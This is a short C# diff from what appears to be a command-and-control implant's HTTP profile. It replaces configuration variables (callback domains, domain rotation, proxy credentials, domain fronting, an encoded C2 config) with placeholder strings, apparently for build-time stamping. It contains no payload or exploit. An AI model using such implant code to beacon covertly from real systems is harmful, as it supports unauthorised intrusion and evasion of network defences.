@@ -43,18 +43,18 @@ namespace Agent.Profiles
             this.messageManager = messageManager;
             
             // Parse parameters from config
-            this.callbackDomains = parseCallbackDomains(callback_domains.Split(','));
-            this.domainRotation = domain_rotation;
-            this.failoverThreshold = failover_threshold;
-            this.timeoutSeconds = timeout;
-            this.proxyHost = proxy_host;
-            this.proxyPort = proxy_port;
-            this.proxyUser = proxy_user;
-            this.proxyPass = proxy_pass;
-            this.domainFront = domain_front;
+            this.callbackDomains = parseCallbackDomains("callback_domains".Split(','));
+            this.domainRotation = "domain_rotation";
+            this.failoverThreshold = Int32.Parse("failover_threshold");
+            this.timeoutSeconds = Int32.Parse("timeout");
+            this.proxyHost = "proxy_host";
+            this.proxyPort = Int32.Parse("proxy_port");
+            this.proxyUser = "proxy_user";
+            this.proxyPass = "proxy_pass";
+            this.domainFront = "domain_front";
             
             // Load malleable profile configuration
-            string rawConfig = decodeBase64Config(raw_c2_config);
+            string rawConfig = decodeBase64Config("raw_c2_config");
             if (!string.IsNullOrEmpty(rawConfig))
             {
                 this.config = HttpxConfig.FromJson(rawConfig);
